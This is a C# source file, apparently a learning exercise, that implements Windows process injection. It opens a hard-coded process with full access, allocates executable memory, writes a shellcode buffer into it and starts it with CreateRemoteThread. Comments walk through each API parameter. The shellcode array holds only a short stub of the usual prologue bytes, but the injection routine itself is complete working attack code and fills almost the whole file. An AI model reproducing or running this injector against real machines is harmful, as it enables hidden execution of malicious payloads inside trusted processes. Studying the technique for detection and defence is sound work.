using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace inject
{
     class Program
    {
        //import open process to
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        /*
        import open process 
         HANDLE OpenProcess(
            DWORD dwDesiredAccess, -> access right for remote process, we want PROCESS_ALL_ACCESS or hex 0x001F0FFF
            BOOL bInheritHandle, -> child process can inherit this handle? set false, 
            DWORD dwProcessId ->the process ID that you want to target, in this case we use expolrer 
          );
         */
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        /*import virtualAllocEx to allocate memeory for our shellcode
        LPVOID VirtualAllocEx(
            HANDLE hProcess, -> process handle, return value from openprocess
            LPVOID lpAddress, -> desired address of the allocation in the remote process, if the addrss is allready in used, the called will fail
            SIZE_T dwSize, -> desired size of allocation
            DWORD flAllocationType, -> allocation type, we want to use MEM_COMMIT(0x1000) and MEM_RESERVE(0x3000)
            DWORD flProtect -> memory protections, we want PAGE_EXECUTE_READWRITE, hex 0x40
           );
         
         */
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        //import WriteProcessMemory, so we can copy shellcode into the remote process
        /*
        BOOL WriteProcessMemory(
            HANDLE hProcess, -> process handle 
            LPVOID lpBaseAddress, -> base address created by virtualAllocEx
            LPCVOID lpBuffer, -> payload byte array
            SIZE_T nSize, -> payload size
            SIZE_T *lpNumberOfBytesWritten ->pointer to a location in memory lpNumberOfBytesWritten to output how much data was copied
);
         */
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        //last, execute the shllecode with CreateRemoteThread
        /*
         HANDLE CreateRemoteThread(
            HANDLE hProcess, -> process handle 
            LPSECURITY_ATTRIBUTES lpThreadAttributes, -> desired security descriptor, use default, 0
            SIZE_T dwStackSize, -> stack size, defult value 0 should be okay
            LPTHREAD_START_ROUTINE lpStartAddress, -> starting address of the thread, address of the buffer we allocated
            LPVOID lpParameter, -> pointer to variables, for function parameters, since we don't have anything pass NULL
            DWORD dwCreationFlags, -> flags? ignore for now
            LPDWORD lpThreadId -> output variable for thread ID, we can ignore
           );
         */
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
      
        static void Main(string[] args)
        {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            // create c# shell code array
            byte[] buf = new byte[7] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc };

            //create a pointer
            IntPtr outSize;
            //out outSize, the out keyword to make the outSize is passed by reference instead of value. this is for argument type alignment.
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);


        }
    }
}
